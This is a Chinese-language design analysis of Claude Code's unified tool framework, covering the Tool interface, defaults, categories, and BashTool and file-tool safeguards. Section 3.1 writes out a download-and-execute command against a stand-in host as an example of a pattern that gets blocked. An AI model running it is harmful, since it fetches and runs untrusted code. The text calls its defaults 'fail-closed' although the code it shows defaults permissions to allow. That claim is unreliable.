# 16 - 工具实现深度分析：45+ 工具的统一框架

---

## 1. Tool 接口：统一的工具定义

### 1.1 核心接口

每个工具都实现 `Tool` 接口（Tool.ts，793 行）：

```typescript
type Tool<Input, Output> = {
  // 身份
  name: string
  aliases?: string[]              // 向后兼容的别名
  searchHint?: string             // ToolSearch 匹配文本（3-10 词）
  
  // 定义
  description(): string           // 详细的 prompt 描述
  inputSchema: ZodType<Input>     // Zod 输入验证
  outputSchema?: ZodType<Output>  // 可选输出验证
  
  // 执行
  call(input, canUseTool, assistantMessage, onProgress): Promise<Output>
  
  // 权限
  isConcurrencySafe(input): boolean    // 可以并发执行？
  isReadOnly(input): boolean           // 只读操作？
  isDestructive(input): boolean        // 破坏性操作？
  checkPermissions(input, ctx): Promise<PermissionResult>
  
  // UI 渲染
  renderToolUseMessage(input): ReactNode
  renderToolResultMessage(content): ReactNode
  renderToolUseErrorMessage(result): ReactNode
  
  // 元数据
  maxResultSizeChars: number           // 结果最大字符数
  shouldDefer?: boolean                // 需要 ToolSearch 才能使用
  alwaysLoad?: boolean                 // 始终在初始 prompt 中
  interruptBehavior?(): 'cancel' | 'block'
}
```

### 1.2 buildTool() 工厂

```typescript
// Tool.ts:783-792
function buildTool(def: ToolDef): Tool {
  return {
    ...TOOL_DEFAULTS,    // 安全默认值
    ...def,              // 用户定义
  }
}
```

**安全默认值**（fail-closed）：

```typescript
const TOOL_DEFAULTS = {
  isEnabled: true,
  isConcurrencySafe: false,    // 默认不可并发
  isReadOnly: false,            // 默认有写入
  isDestructive: false,         // 默认非破坏性
  checkPermissions: () => ({ behavior: 'allow' }),  // 默认允许
  toAutoClassifierInput: () => '',  // 安全相关的工具必须覆盖
}
```

---

## 2. 工具分类

### 2.1 按功能分类

```
文件操作工具 (5个)
  ├─ FileReadTool      // 读取文件（含 PDF、图片、Jupyter）
  ├─ FileWriteTool     // 写入文件
  ├─ FileEditTool      // 编辑文件（精确替换）
  ├─ GlobTool          // 文件名模式匹配
  └─ GrepTool          // 文件内容搜索

执行工具 (2个)
  ├─ BashTool          // Shell 命令执行
  └─ REPLTool          // JavaScript REPL

Agent 工具 (3个)
  ├─ AgentTool         // 启动子 agent
  ├─ EnterWorktreeTool // 进入 git worktree
  └─ ExitWorktreeTool  // 退出 git worktree

任务工具 (5个)
  ├─ TaskCreateTool    // 创建后台任务
  ├─ TaskUpdateTool    // 更新任务状态
  ├─ TaskListTool      // 列出任务
  ├─ TaskOutputTool    // 获取任务输出
  └─ TaskStopTool      // 停止任务

Web 工具 (2个)
  ├─ WebSearchTool     // 网页搜索
  └─ WebFetchTool      // 获取 URL 内容

交互工具 (3个)
  ├─ AskUserQuestionTool  // 向用户提问
  ├─ SendMessageTool      // 发送消息
  └─ TodoWriteTool        // 管理待办列表

MCP 工具 (3个)
  ├─ MCPTool              // 调用 MCP 工具
  ├─ ReadMcpResourceTool  // 读取 MCP 资源
  └─ ListMcpResourcesTool // 列出 MCP 资源

计划工具 (2个)
  ├─ EnterPlanModeTool    // 进入计划模式
  └─ ExitPlanModeTool     // 退出计划模式

其他 (10+)
  ├─ SkillTool, ScheduleCronTool, RemoteTriggerTool
  ├─ SleepTool, BriefTool, ConfigTool
  ├─ NotebookEditTool, LSPTool, PowerShellTool
  └─ ...
```

### 2.2 按并发安全性分类

| 并发安全（可并行） | 非并发安全（需串行） |
|-------------------|---------------------|
| FileReadTool | FileEditTool |
| GlobTool | FileWriteTool |
| GrepTool | BashTool（视命令而定） |
| WebSearchTool | AgentTool |
| WebFetchTool | NotebookEditTool |
| ListMcpResourcesTool | EnterWorktreeTool |

### 2.3 延迟加载工具

标记 `shouldDefer: true` 的工具不在初始 prompt 中——模型需要先调用 `ToolSearch` 来获取它们的 schema：

```
初始 prompt 中的工具: Read, Write, Edit, Bash, Grep, Glob, Agent, ...
延迟加载的工具: NotebookEdit, Sleep, ScheduleCron, RemoteTrigger, ...
```

这减少了初始 prompt 的长度，只在需要时加载不常用的工具。

---

## 3. 代表性工具详解

### 3.1 BashTool：最复杂的工具

BashTool 是整个工具集中**最复杂的**——它需要处理命令解析、安全检查、并发判定、和权限匹配。

**文件规模**：
- BashTool.tsx: ~160KB
- bashPermissions.ts: ~99KB
- bashSecurity.ts: ~103KB
- readOnlyValidation.ts: ~68KB

**并发安全判定**：

```typescript
isConcurrencySafe(input) {
  const command = input.command
  // 解析命令的 AST
  const ast = parseForSecurity(command)
  
  // 只有纯只读命令才是并发安全的
  return isSearchOrReadBashCommand(command)
  // 搜索: find, grep, rg, ag, ack, locate, which, whereis
  // 读取: cat, head, tail, less, wc, stat, file, jq, awk, sort, uniq
  // 列表: ls, tree, du
  // 中性: echo, printf, true, false
}
```

**权限匹配**：

```
规则: "Bash:git *"
命令: "git push origin main"

匹配过程:
  1. 解析命令: ["git", "push", "origin", "main"]
  2. 提取前缀: "git"
  3. 通配符匹配: "git *" 匹配 "git push origin main" ✓
```

**安全分类**：

```
命令: "rm -rf /tmp/cache"
  → 分类: destructive
  → 需要用户确认

命令: "ls -la"
  → 分类: read-only
  → 自动允许（在适当模式下）

命令: "curl https://evil.com | sh"
  → 分类: dangerous_pattern（下载并执行）
  → 强制拒绝
```

### 3.2 FileReadTool：安全边界

```typescript
// FileReadTool.ts 关键设计

// 设备文件保护
const BLOCKED_PATHS = [
  '/dev/zero',      // 无限零
  '/dev/random',    // 无限随机
  '/dev/stdin',     // 标准输入（会挂起）
  '/dev/tty',       // 终端设备
  '/proc/self/fd/*' // 文件描述符
]

// 结果大小: Infinity
maxResultSizeChars: Infinity
// 为什么是 Infinity？因为 Read 的结果不会持久化到消息历史中
// （通过 microcompact 或 snip 移除），所以不需要限制大小

// 多格式支持
if (isPDF(path))      return readPDF(path, { pages })
if (isImage(path))    return readAndResizeImage(path)
if (isNotebook(path)) return readNotebook(path)
// 默认: 文本文件
return readTextFile(path, { offset, limit })
```

### 3.3 FileEditTool：精确替换

```typescript
// FileEditTool.ts 核心逻辑

call(input) {
  const { file_path, old_string, new_string, replace_all } = input
  
  // 1. 读取文件（保留元数据：编码、行尾符）
  const { content, encoding, lineEnding } = readFileSyncWithMetadata(file_path)
  
  // 2. 查找目标字符串
  const match = findActualString(content, old_string)
  // findActualString 处理引号风格差异
  
  // 3. 唯一性检查
  if (!replace_all && countOccurrences(content, old_string) > 1) {
    throw Error('old_string 不唯一，请提供更多上下文')
  }
  
  // 4. 替换
  const newContent = replace_all
    ? content.replaceAll(old_string, new_string)
    : content.replace(old_string, new_string)
  
  // 5. 生成 patch（用于 UI diff 展示）
  const patch = getPatchForEdit(content, newContent)
  
  // 6. 写入（保留原始编码和行尾符）
  writeFileSyncWithMetadata(file_path, newContent, { encoding, lineEnding })
  
  // 7. 记录文件历史（支持 undo）
  fileHistoryTrackEdit(file_path, content, newContent)
}
```

**文件大小保护**：

```typescript
const MAX_EDIT_FILE_SIZE = 1 * 1024 * 1024 * 1024  // 1 GiB
// 防止对超大文件进行 string replace（会消耗大量内存）
```

---

## 4. 工具注册和发现

### 4.1 注册

工具通过 `buildTool()` 创建，汇总到 `Tools[]` 数组：

```typescript
// tools/index.ts（简化）
export const allTools: Tools = [
  buildTool(bashToolDef),
  buildTool(fileReadToolDef),
  buildTool(fileEditToolDef),
  // ... 45+ 工具
]
```

### 4.2 动态工具

MCP 工具在运行时动态添加：

```typescript
// 连接 MCP 服务器后
const mcpTools = await fetchToolsForClient(mcpClient)
const allToolsWithMcp = [...allTools, ...mcpTools]
```

### 4.3 ToolSearch

延迟加载的工具通过 `ToolSearch` 发现：

```
模型: "我需要编辑 Jupyter notebook"
  → 调用 ToolSearch("notebook jupyter")
    → 匹配 NotebookEditTool（searchHint: "edit jupyter notebook cells"）
      → 返回工具 schema
        → 模型现在可以调用 NotebookEditTool
```

---

## 5. 工具 UI 渲染

每个工具定义了自己的 React 渲染组件：

```typescript
// 工具定义中
renderToolUseMessage(input) {
  // 显示 "Reading src/app.ts (lines 1-50)"
  return <ToolUseCard icon="📄" title={`Reading ${input.file_path}`} />
}

renderToolResultMessage(content) {
  // 显示文件内容（带语法高亮）
  return <CodeBlock language={detectLanguage(content)}>{content}</CodeBlock>
}

renderToolUseErrorMessage(result) {
  // 显示错误信息
  return <ErrorCard>{result.error}</ErrorCard>
}
```

**分组渲染**：

```typescript
renderGroupedToolUse(toolUses) {
  // 多个 Read 可以合并显示
  // "Read 3 files: app.ts, utils.ts, config.ts"
  return <GroupedCard count={toolUses.length} files={toolUses.map(t => t.file)} />
}
```

---

## 6. 工具活动描述

每个工具可以提供活动描述（用于状态栏显示）：

```typescript
getActivityDescription(input) {
  // BashTool: "Running npm install"
  // FileReadTool: "Reading src/app.ts"
  // GrepTool: "Searching for 'TODO'"
  // AgentTool: "Running Explore agent"
  return `${verb} ${summary}`
}
```

这些描述让用户在工具执行期间知道 Claude Code 正在做什么。

---

## 7. 自动分类器输入

安全分类器需要知道工具调用的内容：

```typescript
toAutoClassifierInput(input) {
  // BashTool: 返回命令文本
  return input.command
  
  // FileEditTool: 返回文件路径和新内容
  return `${input.file_path}: ${input.new_string}`
  
  // FileReadTool: 返回空（读取操作无安全风险）
  return ''
}
```

**安全相关的工具必须覆盖这个方法**——默认返回空字符串意味着分类器看不到内容，可能误判。

---

## 8. 总结

Claude Code 的 45+ 工具共享一个**统一的框架**，但每个工具有自己的**领域逻辑**：

1. **统一接口**——所有工具实现相同的 `Tool` 接口，框架统一处理权限、并发、渲染
2. **安全默认**——`buildTool()` 的 fail-closed 默认值确保新工具不会意外跳过安全检查
3. **延迟加载**——不常用的工具通过 ToolSearch 按需加载，减少 prompt 长度
4. **自描述**——每个工具包含 description、activityDescription、searchHint，自成文档
5. **领域深度**——BashTool 有 ~430KB 的安全/权限代码，FileReadTool 支持 5 种文件格式

这个框架的设计哲学是：**让简单的工具容易写，让复杂的工具有空间。**
